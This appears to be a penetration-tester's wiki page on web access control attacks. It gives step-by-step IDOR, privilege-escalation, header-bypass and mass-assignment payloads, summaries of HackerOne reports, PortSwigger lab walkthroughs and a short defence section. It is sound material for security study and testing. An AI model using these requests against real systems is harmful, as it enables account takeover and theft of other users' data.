---
title: "Access Control Attacks"
type: technique
tags: [access-control, exploitation, h1, portswigger, privilege-escalation, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [ps-general-concepts, h1-scraped-access-control, h1-scraped-idor, payloadsallthethings-idor, git-portswigger-all-labs]
---

## What it is

Access control attacks exploit failures in enforcing who is permitted to perform which actions on which resources. Broken access controls are among the most common and critical web vulnerabilities, enabling attackers to escalate privileges, access other users' data, or perform unauthorised administrative functions.

## How it works

Access control sits on top of authentication and session management:

- **Authentication** confirms who the user is
- **Session management** tracks which requests belong to that user
- **Access control** decides whether that user may perform the requested action

Failures occur because access control logic is designed by humans and applied inconsistently across the application. Three main categories exist:

1. **Vertical privilege escalation** — a lower-privileged user accesses functionality reserved for higher-privileged users (e.g., admin panel)
2. **Horizontal privilege escalation / IDOR** — a user accesses another user's data at the same privilege level
3. **Context-dependent access control failures** — state-based checks missing (e.g., accessing step 2 of a multi-step process without completing step 1)

## Prerequisites

- A user account (any privilege level) on the target application
- For admin function access: knowledge or discovery of the admin URL/endpoint
- For IDOR: a user-controlled parameter that references a data object (ID, filename, username)

## Methodology

### 1. Discover Unprotected Functionality (Vertical Escalation)

Browse the application fully as a low-privilege user. Then attempt direct navigation to administrative paths:

```
https://target.com/admin
https://target.com/administrator
https://target.com/manage
https://target.com/admin/users
https://target.com/robots.txt   ← may disclose restricted paths
```

Check `robots.txt` for `Disallow` entries pointing to sensitive URLs. Review JavaScript source files for hardcoded admin URLs:

```javascript
var isAdmin = false;
if (isAdmin) {
    var adminPanelTag = document.createElement('a');
    adminPanelTag.setAttribute('https://target.com/administrator-panel-yb556');
    // URL visible in source even when isAdmin=false
}
```

Admin URLs may be disclosed in client-side JS regardless of the user's role. Audit all script files.

Use wordlists to brute-force directory paths:

```sh
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
```

### 2. Parameter-Based Access Control Bypass

Some applications store the user's role in a user-controllable location and make access decisions based on it:

```
# Query string
https://target.com/home.jsp?admin=true
https://target.com/home.jsp?role=1

# Hidden form field
<input type="hidden" name="role" value="user">

# Cookie
Cookie: role=user
```

Modify these values and observe whether privileged functionality becomes accessible. Change `role=user` to `role=admin`, `admin=false` to `admin=true`, or `role=1` to `role=0` (depending on the application's logic).

### 3. Horizontal Privilege Escalation / IDOR

Identify any request where user-controlled input references a resource owned by a specific user:

```http
GET /account?id=1002
GET /api/orders/12345
GET /user/wiener/profile
GET /download?file=statement_wiener.pdf
```

Change the identifier to another value. If the application returns the other user's data without verifying ownership against the current session, IDOR is confirmed.

Common IDOR patterns:

| Parameter | Example | Attack |
|---|---|---|
| Numeric ID | `id=1001` | Increment/decrement: `id=1002` |
| Username | `user=wiener` | Change to target: `user=carlos` |
| Filename | `file=report_wiener.pdf` | Guess/enumerate: `file=report_carlos.pdf` |
| GUID/UUID | `id=550e8400-e29b...` | Enumerate via another endpoint or OSINT |
| Hashed ID | `id=098f6bcd4621d373cade4e832627b4f6` | Identify hashing algorithm and hash target ID |
| Weak PRNG | `id=5ae9b90a2c144b9def01ec37` | Predict MongoDB Object IDs or UUIDv1 (timestamp-based) |
| Wildcard | `id=*` or `%` or `.` or `_` | Request all data bypassing specific ID check |

**IDOR Payload Tips:**
- Change the HTTP method: `POST` → `PUT`
- Change content type: `XML` → `JSON`
- Transform numerical values to arrays: `{"id":19}` → `{"id":[19]}`
- Parameter Pollution: `user_id=hacker_id&user_id=victim_id`

### 4. Password Change Functionality — Username Manipulation

The password change form may accept the username as a hidden field. Modify it to target another account and brute-force the current password using response differences:

```http
POST /my-account/change-password HTTP/1.1

username=carlos&current-password=§candidate§&new-password-1=newpass&new-password-2=different
```

Set `new-password-1` and `new-password-2` to different values. The server returns `New passwords do not match` only when `current-password` is correct — use this to confirm the right password without actually changing it. Then log in with the identified credential.

### 5. Forced Browsing / Multi-Step Process Bypass

Directly access application states or pages that should only be reachable via a specific workflow:

```
# Multi-step process
Step 1: /checkout/cart
Step 2: /checkout/address
Step 3: /checkout/confirm

# Access step 3 directly without completing steps 1-2
GET /checkout/confirm
```

If the server processes the request without validating prior state, the access control is bypassed.

Developers often implement strong access controls on the first step of a multi-step process but forget to enforce them on subsequent steps. To exploit: complete the full flow as a privileged user in one browser session, then replay the final confirmation request using a low-privilege session cookie:

```http
POST /admin/users/upgrade HTTP/1.1
Cookie: session=WIENER_SESSION_TOKEN

action=upgrade&confirmed=true&username=wiener
```

Even though step 1 (the upgrade form) correctly blocked the low-privilege user, step 2 (the confirmation) may lack the same check.

### 6. HTTP Method Substitution

Some applications enforce access control only on specific HTTP methods. A POST endpoint that returns 401 for a low-privilege user may be accessible via GET:

```
Burp Repeater → right-click request → "Change request method"
POST /admin-roles → GET /admin-roles?username=wiener&action=upgrade
```

The server enforces the access control on POST but not on GET (or POSTX, HEAD, etc.). Try all methods when an endpoint returns 401.

### 7. X-Original-URL / X-Rewrite-URL Header Bypass

Some front-end frameworks or load balancers check the URL in the `X-Original-URL` or `X-Rewrite-URL` header rather than (or in addition to) the actual request path. If the platform-level access control reads the real URL but the application reads the header, sending a blocked path in the header with an innocuous real URL can bypass the restriction:

```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

The front-end permits `GET /` (no restriction), but the application routes the request to `/admin/delete` via the header value. The `username` parameter must be in the real query string, not the header path.

Also try: `X-Rewrite-URL: /admin`

### 8. JSON Role Injection in Profile Update

Some applications expose a profile-update endpoint (e.g., update email) that returns the user's full object in the response — including internal fields like `roleid`. If the endpoint also accepts arbitrary JSON fields and applies them to the model, inject the privileged role value:

```http
POST /my-account/change-email HTTP/1.1
Content-Type: application/json

{"email":"attacker@evil.com","roleid":2}
```

Observe the response: if the server echoes back `"roleid":2`, the role has been updated. Then access the admin panel.

### 9. GUID / Unpredictable ID Discovery via Public Surfaces

When an application uses GUIDs or other non-sequential identifiers as user IDs, the IDs may be exposed in public-facing surfaces (blog post authors, review pages, forum profiles). Enumerate these to obtain victim IDs for IDOR:

```
1. Browse public content authored by the target user
2. Click username / author profile link
3. Capture the GUID from the URL or response:
   GET /user?id=0cae1b22-401e-46b4-b767-09e89441403a
4. Use that GUID to access the target's private account page
```

### 10. Data Leakage in 302 Redirect Response Body

When a server detects unauthorized access and issues a `302 Found` redirect to `/login`, the response body may still contain the target user's data before the browser follows the redirect. In Burp Repeater (which does not auto-follow redirects), the full HTML body of the 302 response is visible:

```http
HTTP/2 302 Found
Location: /login
Content-Length: 3395

<!-- response body still contains target user's API key / profile data -->
```

Check the 302 response body — do not stop at the status code.

### 11. IDOR on Static / Sequential Files

File download endpoints that serve user-generated content (chat transcripts, invoices, reports) using sequential filenames are IDOR targets:

```
GET /download-transcript/2.txt   ← your own transcript
GET /download-transcript/1.txt   ← another user's transcript (decrement)
```

Enumerate numeric filenames up and down from the one you received. This also applies to invoice PDFs, export files, and any sequentially named asset.

### 12. Referer Header Bypass

If an endpoint checks only the `Referer` header to determine whether the request came from an authorised page, forge it:

```http
GET /admin/promote?username=wiener HTTP/1.1
Referer: https://target.com/admin
Cookie: session=WIENER_SESSION_TOKEN
```

The server trusts that the request originated from `/admin` because the `Referer` says so, without validating the actual session's privilege level.

## Key Payloads / Examples

Role parameter manipulation:

```http
GET /admin/deleteUser?username=carlos HTTP/1.1
Cookie: session=YOUR_SESSION; role=admin
```

IDOR — user profile access:

```http
GET /api/user/profile?id=1337 HTTP/1.1
Cookie: session=YOUR_SESSION
# Enumerate id values; look for 200 responses belonging to other users
```

Robots.txt discovery:

```sh
curl https://target.com/robots.txt
# Look for: Disallow: /admin-secret-path
```

JavaScript admin URL leak — search in browser DevTools or:

```sh
curl https://target.com/static/app.js | grep -i admin
```

Hidden field manipulation (modify in Burp before forwarding):

```http
POST /login/home HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=user&role=admin
```

## Bypasses and Variants

| Technique | Mechanism |
|---|---|
| Unprotected admin URL | No server-side enforcement; URL simply not linked in UI |
| Security by obscurity | Obfuscated URL (e.g., `/admin-yb556`) leaked in JS source |
| Parameter tampering | `?admin=true`, `?role=1`, `Cookie: admin=true` |
| Cookie role value | `Admin=false` → `Admin=true`; intercept all requests in session |
| JSON role injection | POST profile-update with extra `"roleid":2` field |
| IDOR | User-controlled ID references another user's data |
| GUID leakage | Non-sequential IDs exposed in public user profiles / blog posts |
| Static file IDOR | Sequential filenames (chat transcripts, invoices) — increment/decrement |
| Redirect body leakage | 302 response body contains target data before browser follows redirect |
| Password disclosure via IDOR | Account page prefills password; change `?id=` to admin to read admin password |
| Hidden field injection | `username` in hidden form field changed to victim |
| Forced browsing | Direct URL access bypasses workflow state requirements |
| Multi-step skip | Final confirmation step missing access control; replay with low-priv cookie |
| HTTP method substitution | POST blocked → change to GET to bypass method-specific check |
| X-Original-URL header | Platform checks real URL; app routes by header value — send blocked path in header |
| X-Rewrite-URL header | Same mechanism as X-Original-URL on different frameworks |
| Referer-based access control | Server only checks `Referer` header, which is forgeable |
| Platform misconfiguration | URL-level access control overridden at application level |

**Horizontal-to-vertical escalation**: IDOR on another user's data may expose credentials or admin functionality, converting a horizontal bypass into a vertical one (e.g., reading an admin's profile reveals their password reset link).

## Real-World Examples (HackerOne — paid reports)

Source: HackerOne disclosed reports, paid bounties only. 81 access-control + 50 IDOR = 131 combined paid reports, top bounty $20,000.

### Pattern 1: IDOR on project import stealing private objects from other GitLab projects (Critical — GitLab, $20,000 × 2)

Two separate critical reports ([#743953](https://hackerone.com/reports/743953) and [#767770](https://hackerone.com/reports/767770), $20,000 each) found that GitLab's project import feature could be manipulated to copy private objects — issues, merge requests, snippets, notes, and repository content — from projects the attacker had no access to. The import pipeline resolved object references by ID without verifying that the importing user had read access to the source objects. Chained with [#689314](https://hackerone.com/reports/689314) ($12,000 critical), which found that project templates could copy confidential issues and repository data: the template feature performed a deep copy of project state without re-checking permissions on each copied object. Pattern: import/copy/template features that operate at a different permission scope than normal read operations are extremely high-value IDOR targets — they move data between contexts and often skip the per-object access checks applied to direct reads.

### Pattern 2: Horizontal IDOR — deleting any Snapchat user's Content Spotlight (High — Snapchat, $15,000)

[Report #1819832](https://hackerone.com/reports/1819832) found that the Content Spotlight deletion endpoint accepted a spotlight ID without verifying ownership. An attacker who obtained any other user's spotlight ID (discoverable via the public feed) could delete it. The $15,000 bounty for a deletion IDOR reflects that destructive operations (delete, modify) on other users' content are treated as high-impact even without data disclosure. Pattern: always test destructive endpoints (DELETE, POST with delete action) with IDs belonging to other users — deletion often gets less access control attention than read operations.

### Pattern 3: IDOR on GraphQL mutation deleting certifications from any HackerOne user (High — HackerOne, $12,500)

[Report #2122671](https://hackerone.com/reports/2122671) found that the `CreateOrUpdateHackerCertification` GraphQL mutation accepted a user ID parameter that was not validated against the authenticated user's session. An attacker could call this mutation with any user's ID to delete all their certifications and credentials from the HackerOne profile. Pattern: GraphQL mutations that perform write/delete operations require the same ownership checks as REST endpoints — the mutation name often implies creation but the underlying logic performs updates or deletes. Always fuzz the user/owner ID in GraphQL write mutations.

### Pattern 4: IDOR adding secondary users to any PayPal Business account (High — PayPal, $10,500)

[Report #415081](https://hackerone.com/reports/415081) found that the `POST /businessmanage/users/api/v1/users` endpoint accepted a business account ID that was not verified against the authenticated session. An attacker could add themselves as a secondary user to any PayPal Business account, gaining full control of that account's payment and management functions. Pattern: business/enterprise SaaS applications often have secondary user management that is developed separately from core user management — access control checks are frequently missed or applied inconsistently. The $10,500 bounty reflects direct financial account takeover.

### Pattern 5: IDOR reading any private GitHub repository (High — GitHub, $10,000)

[Report #3124517](https://hackerone.com/reports/3124517) demonstrated reading the contents of another user's private repository without authorisation. The specific mechanism involved an API or webhook endpoint that resolved repository references by ID rather than name, and the ID-based lookup did not enforce the requesting user's read permissions. Pattern: Git hosting platforms often expose two ways to reference a repository — by name (e.g., `owner/repo`) and by internal numeric ID. The ID-based path may skip the name-based ACL check. Always check if an application has both name-based and ID-based access paths and whether they enforce permissions consistently.

### Pattern 6: IDOR chaining for arbitrary charges to Uber for Business payment accounts (High — Uber, $5,750)

[Report #1145428](https://hackerone.com/reports/1145428) chained multiple IDOR vulnerabilities in Uber's voucher system. Individually, each bypass was low-severity, but together they allowed an attacker to: (1) enumerate victim U4B (Uber for Business) accounts by ID, (2) assign vouchers to those accounts without authorisation, (3) trigger arbitrary charges to the victim's payment method. Pattern: IDOR chains are powerful — look for a sequence of operations where each step returns or accepts an ID that feeds the next step, even if each individual step seems low-impact.

### Pattern 7: Privilege escalation via Kibana — user with Visualize privilege achieving RCE (Critical — Elastic, $10,000 + $5,000)

Two reports ([#852613](https://hackerone.com/reports/852613), $10,000; [#861744](https://hackerone.com/reports/861744), $5,000) found that Kibana users with the "Visualize" privilege (a read-level privilege) could escalate to full server RCE. The path involved the Kibana timelion expression language or a reporting feature that rendered content via Chromium — the report generation pipeline ran with Kibana's own OS-level privileges. A third related report ([#1168765](https://hackerone.com/reports/1168765), $10,000) covered RCE via the reporting/Chromium component. Pattern: features that involve server-side rendering (PDF export, screenshot, thumbnail generation, sandboxed scripting) frequently run with elevated OS privileges and are a vertical escalation hotspot even for users with limited application-level roles.

### Pattern 8: Account takeover via billing flow improper authorisation (Critical — Chaturbate, $8,000)

[Report #394329](https://hackerone.com/reports/394329) found that Chaturbate's billing flow allowed an attacker to trigger account ownership changes by manipulating the billing confirmation request. The billing endpoint changed the account's associated email without verifying that the requester was the account owner, enabling full account takeover. Pattern: billing, payment, and subscription management flows are high-value vertical escalation targets — they often handle significant account-level changes (email, password, ownership) and receive less security testing than login flows.

### Pattern 9: Cloudflare Email Forwarding — hijacking emails to any domain using Cloudflare (Critical — Cloudflare, $6,000)

[Report #1419341](https://hackerone.com/reports/1419341) found that Cloudflare's Email Forwarding feature had an authorisation flaw allowing an attacker to configure email forwarding for a domain they did not own. By sending a crafted request with another domain's zone ID, the attacker could redirect all email sent to that domain to an attacker-controlled address. Pattern: cloud provider features that accept a resource ID (zone ID, account ID, project ID) and perform write operations require strict server-side ownership verification — the ID being a secret UUID is not sufficient access control.

### Pattern 10: Kubernetes ingress-nginx path allows serviceaccount token retrieval (High — Kubernetes, $2,500)

[Report #1382919](https://hackerone.com/reports/1382919) found that the ingress-nginx admission controller could be exploited to retrieve the ingress-nginx ServiceAccount token by crafting a malicious Ingress object with a specially crafted `nginx.ingress.kubernetes.io/auth-url` annotation. This gave access to the ServiceAccount token, which had cluster-wide read permissions. A related report ([#1842829](https://hackerone.com/reports/1842829), $2,500) found a kOps privilege escalation on GCP where the GCE provider assigned overly permissive IAM roles during cluster creation. Pattern: Kubernetes admission controllers and operator permissions are vertical escalation targets — a low-privilege namespace user who can create Ingress or CRD objects may be able to influence cluster-admin-level components.

### Pattern 11: IDOR on Reddit subreddit mod logs accessible to non-moderators (High — Reddit, $5,000)

[Report #1658418](https://hackerone.com/reports/1658418) found that the mod log API endpoint for any public or restricted subreddit was accessible without moderator privileges. The endpoint accepted the subreddit name and returned mod actions (bans, removals, approvals) that should only be visible to moderators. The same researcher also found [#1213237](https://hackerone.com/reports/1213237) ($5,000) — deleting all DMs on RedditGifts.com via IDOR on the message deletion endpoint. Pattern: community platforms with moderator roles frequently have mod-only API endpoints that are not wired into the main access control framework — enumerate `/api/mod/`, `/api/v1/mod/`, or similar prefixes with regular user tokens.

### Pattern 12: IDOR changing email/personal data on any Stripe account (Critical — Stripe, $3,000)

[Report #1250037](https://hackerone.com/reports/1250037) found an IDOR in Stripe's account management flow where the email or personal data change request accepted an account identifier that was not validated against the authenticated session. An attacker could modify another user's account details — a critical account takeover primitive even without direct credential theft. Pattern: account update endpoints (email change, phone change, name change) are high-value IDOR targets because they directly enable account takeover; test them with IDs belonging to accounts you control in a second session.

## Detection and Defence

- Implement access control server-side on every request — never rely on client-side controls, hidden fields, or URL obscurity
- Use a deny-by-default model: explicitly grant access rather than blocking specific cases
- Log and monitor all access control failures — they may indicate enumeration activity
- Enforce ownership checks in code when accessing user-specific data: verify that the authenticated user's session identity matches the requested resource
- Do not use user-controllable parameters (cookies, hidden fields, query strings) to determine role or privilege level
- Conduct thorough code review of all endpoints for missing authorisation decorators/middleware

## API-Specific Access Control Failures

REST APIs introduce access control failure patterns that go beyond standard IDOR. See [[api-security]] for the full OWASP API Top 10 methodology.

### BOLA (Broken Object Level Authorization — API1)

The API-layer equivalent of IDOR, but made systematic: for every endpoint taking an object ID, substitute IDs owned by a different account at the same or lower privilege level.

**Differs from web IDOR** in that the test must be role-aware (user-A accessing user-B's object) and must cover all HTTP methods independently — a `GET` may be protected while `PUT`/`DELETE` on the same path is not.

```
GET /api/v1/orders/102        ← attacker's token, victim's order ID
PUT /api/v1/orders/102        ← same bypass via different method
DELETE /api/v1/orders/102
```

### BFLA (Broken Function Level Authorization — API5)

A low-privilege role calls an endpoint reserved for admin operations. The server enforces object ownership but not the privilege level required to invoke certain functions.

```bash
# Test admin paths with a user-level token
curl -H "Authorization: Bearer $USER_TOKEN" https://api.example.com/api/v1/admin/users
curl -X DELETE -H "Authorization: Bearer $USER_TOKEN" https://api.example.com/api/v1/users/102
```

### Mass Assignment (API6)

ORMs and frameworks auto-assign all JSON body fields to the model object. Injecting undocumented privileged fields into write endpoints can elevate privileges or modify protected state.

```http
POST /api/v1/users HTTP/1.1
Content-Type: application/json

{"email":"attacker@evil.com","password":"x",
 "is_admin":true,"role":"admin","verified":true,"credit":99999}
```

Fields to try: `is_admin`, `role`, `admin`, `verified`, `email_verified`, `balance`, `credit`, `status`, `plan`, `permissions`, `group_id`

### Broken Object Property Level Authorization (API3)

A low-privilege role reads or writes individual properties of an object that should be restricted to higher privilege. Distinct from full BOLA — the endpoint is accessible but leaks or accepts restricted fields.

```bash
# Check if low-priv response leaks admin-only fields
curl -H "Authorization: Bearer $USER_TOKEN" https://api.example.com/api/v1/users/me | jq .
# Look for: ssn, admin_notes, internal_score, is_admin, raw_password_hash, etc.
```

## Tools

- [[burp-suite]] — Intruder for IDOR enumeration, Repeater for manual parameter manipulation
- [[ffuf]] — directory/endpoint brute force
- dirsearch — recursive directory enumeration
- [[burp-suite]] Autorize extension — automated detection of horizontal/vertical access control failures across roles
- [[burp-suite]] Authz and AuthMatrix extensions — further IDOR and access control testing

---

## Insecure Management Interfaces

Insecure Management Interfaces are administrative panels or APIs exposed publicly without proper authentication or utilizing default credentials. They often bypass application-level controls completely.

*   **Exposure Checks:** Search for exposed `Spring Boot Actuators` (`/actuator/env`, `/actuator/heapdump`), Tomcat manager panels, or JMX consoles.
*   **Detection (Nuclei):**
```bash
nuclei -t http/exposed-panels -u https://example.com
nuclei -t http/default-logins -u https://example.com
```

## PortSwigger Labs

### Apprentice

#### Lab 1 — Unprotected admin functionality

1. Navigate to `/robots.txt`.
2. Find the `Disallow` entry pointing to the admin panel (e.g., `/administrator-panel`).
3. Browse directly to that path.
4. Delete the target user.

#### Lab 2 — Unprotected admin functionality with unpredictable URL

1. View page source (`Ctrl+U`) on the home/login page.
2. Search for `admin` in the JS — the obfuscated admin panel path is hardcoded in a script.
3. Navigate directly to the discovered path and delete the target user.

#### Lab 3 — User role controlled by request parameter (Cookie: Admin)

1. Log in as `wiener:peter`; intercept with Burp.
2. In the POST `/login` response, observe `Cookie: Admin=false`.
3. In every subsequent request (GET `/my-account`, GET `/admin`, GET `/admin/delete`), change `Admin=false` to `Admin=true` before forwarding.
4. Access `/admin` and delete the target user.

#### Lab 4 — User role can be modified in user profile (JSON roleId)

1. Log in as `wiener:peter`.
2. Use the "Update email" feature and capture the POST request in Burp Repeater.
3. Observe the JSON response contains `"roleid":1`.
4. Add `"roleid":2` to the JSON request body:
```json
{"email":"wiener@evil.net","roleid":2}
```
5. Send — the response confirms the new role. Follow the 302 redirect.
6. The Admin Panel link appears; use it to delete the target user.

#### Lab 5 — User ID controlled by request parameter (username IDOR)

1. Log in as `wiener:peter`; navigate to "My Account".
2. Observe the request: `GET /my-account?id=wiener`.
3. Change `id=wiener` to `id=carlos` in Burp Repeater.
4. The response contains carlos's API key — submit it to solve.

#### Lab 6 — User ID controlled by request parameter, with unpredictable user IDs (GUID leakage)

1. Log in as `wiener:peter`; note your GUID in the `/my-account` request.
2. Browse blog posts on the home page; find a post authored by carlos.
3. Click carlos's username — the URL or page source reveals his GUID.
4. In Burp Repeater, replace wiener's GUID with carlos's in `GET /my-account?id=<GUID>`.
5. Retrieve carlos's API key from the response and submit.

#### Lab 7 — User ID controlled by request parameter with data leakage in redirect

1. Log in as `wiener:peter`; capture `GET /my-account?id=wiener` in Burp Repeater.
2. Change `id=wiener` to `id=carlos` and send.
3. The server responds with `302 Found` redirecting to `/login`, but the **response body** still contains carlos's API key.
4. Read the body of the 302 response (do not follow the redirect) and extract the API key.

#### Lab 8 — User ID controlled by request parameter with password disclosure

1. Log in as `wiener:peter`; observe the account page prefills the password in a masked field.
2. Capture `GET /my-account?id=wiener` in Burp Repeater.
3. Change `?id=wiener` to `?id=administrator`.
4. The response HTML prefills the administrator's password in the password field — extract it from the source.
5. Log in as `administrator` with the leaked password; delete the target user.

#### Lab 9 — Insecure direct object references (sequential chat transcript files)

1. Open the "Live chat" feature; send any message and click "View transcript".
2. Observe the downloaded file is named `2.txt` (sequential ID).
3. Modify the download request to `GET /download-transcript/1.txt`.
4. The file `1.txt` is a previous user's transcript containing carlos's password.
5. Log in as carlos with the leaked password.

---

### Practitioner

#### Lab 10 — URL-based access control can be circumvented (X-Original-URL)

1. Browse to `/admin` — receive "Access Denied" from the front-end.
2. Capture any request to the root (`GET /`) in Burp Repeater.
3. Add the header `X-Original-URL: /admin` and send — verify the admin panel loads.
4. To delete a user, set `X-Original-URL: /admin/delete` and add `username=carlos` to the real query string:
```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```
5. The platform allows `GET /` while the application routes to `/admin/delete` via the header.

#### Lab 11 — Method-based access control can be circumvented

1. Log in as `administrator`; use the admin panel to promote a user — capture that POST request.
2. Note the promotion endpoint: `POST /admin-roles` with body `username=wiener&action=upgrade`.
3. Log out; log in as `wiener:peter`.
4. Paste wiener's session cookie into the captured POST request — receive 401.
5. Right-click the request in Burp → "Change request method" → converts to GET with params in query string.
6. Send the GET request with wiener's session cookie — receive 302, wiener is promoted to admin.

#### Lab 12 — Multi-step process with no access control on one step

1. Log in as `administrator`; complete the full user-upgrade flow — capture both requests (step 1: form submit, step 2: confirmation).
2. Log out; log in as `wiener:peter`.
3. In Burp Repeater, replay only the **confirmation step** (step 2) using wiener's session cookie:
```http
POST /admin-roles HTTP/1.1
Cookie: session=WIENER_SESSION_TOKEN

action=upgrade&confirmed=true&username=wiener
```
4. The server skips the access check on the confirmation step — wiener is promoted to admin.

#### Lab 13 — Referer-based access control

1. Log in as `administrator`; use the admin panel to promote a user — capture the GET request.
   The request has `Referer: https://<lab>/admin`.
2. Log out; log in as `wiener:peter`.
3. In Burp Repeater, replay the same promotion request with wiener's session cookie but keep the forged `Referer: https://<lab>/admin` header:
```http
GET /admin/promote?username=wiener HTTP/1.1
Referer: https://<lab>/admin
Cookie: session=WIENER_SESSION_TOKEN
```
4. The server only checks the `Referer` — wiener is promoted to admin.

---

## Sources

- PortSwigger Academy: Access Control (General Concepts)
- PortSwigger Lab: Unprotected admin functionality
- PortSwigger Lab: Password brute-force via password change (Lab 12)
- `git-apistrike` — OWASP API Top 10 authorization patterns from RevoltSecurities/apistrike
- `git-portswigger-all-labs` — PortSwigger all-labs repo, Access Control section (Labs 1–13)

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[csrf]]
- [[idor]]
- [[client-side-path-traversal]]

## Reproducible hashids: acts_as_hashids default salt = class name

Ruby apps hide sequential primary keys behind a Hashids-encoded id (gems `acts_as_hashids`,
`hashid-rails`, or a raw `Hashids`) so `/notes/5` becomes `/notes/Q36xB7PpDGnZ...`. This is
security-by-obscurity: if the salt is default, ANY object's id is reproducible - it is NOT an
access-control check.

- **Default salt = the model CLASS NAME.** `acts_as_hashids length: 30` with NO `secret:` option
  salts Hashids with the class name (e.g. `"Note"`) and the default alphabet. The encoding is a pure
  function of `(class_name, min_length, id)` - no server secret involved.
- **Confirm the salt from one leaked pair.** Any page that exposes an object's own hashid (an edit
  link, a JSON `url` field) gives a plaintext->hashid pair. Reproduce it, then forge:
```bash
ruby -e 'require "hashids"; puts Hashids.new("ClassName",30).encode(1)'   # == the leaked hashid? salt confirmed
ruby -e 'require "hashids"; puts Hashids.new("ClassName",30).encode(380)' # forge any id
# python: from hashids import Hashids; Hashids(salt="ClassName", min_length=30).encode(id)
```
- **Chains with a missing authz check / a debug "hot-fix".** Combined with an action that skips auth
  (`before_action :authenticate_user!, except: [:show]`) or a shortcut (`if params[:id]=="1" then
  Model.first`), reproducible hashids turn "unguessable id" into full unauth object read - forge the
  id and read every record. See [[access-control]].

<!-- promoted-slug: acts-as-hashids-idor -->

## Media/stream origin BFLA - the API gates the stream, the origin serves it unauth

An API can enforce authorization on the *request-a-stream* call while the actual media (HLS/DASH
segments, thumbnails) is served by a separate **origin/CDN** that enforces nothing. If a role-gated
"admin camera" (or premium/paid video) is fetched through a ticketed API but the underlying
`.m3u8`/segment lives on a plain static origin, request it there directly and skip the API's authz:

```bash
# API path (authorized): needs a role-gated ticket
POST /v1/streams/request {"camera_id":"cam-admin","tier":"admin"}  -> ticket -> /v1/streams/<t>/manifest.m3u8
# Origin path (often UNauthenticated): guess the stream key from the API's manifest/segment URLs
curl -s http://<origin-host>:<port>/hls/cam-admin/playlist.m3u8   # 200, no token -> BFLA
curl -s http://<origin-host>/hls/cam-admin/playlist000.ts -o s0.ts
```

Test methodology: capture the manifest an *authorized* stream returns, note the origin host/port and
the path scheme (`/hls/<id>/...`, `/vod/<id>/...`), then re-request the **restricted** id's manifest
and segments straight from the origin with no token. Same idea for any resource where a gateway/API
authorizes but a static/object store (S3-style bucket, image CDN, download host) serves the bytes.
Reassemble segments with `ffmpeg -i all.ts ...` to review the content. Related: [[idor]], [[ssrf]].

<!-- promoted-slug: media-origin-bfla -->
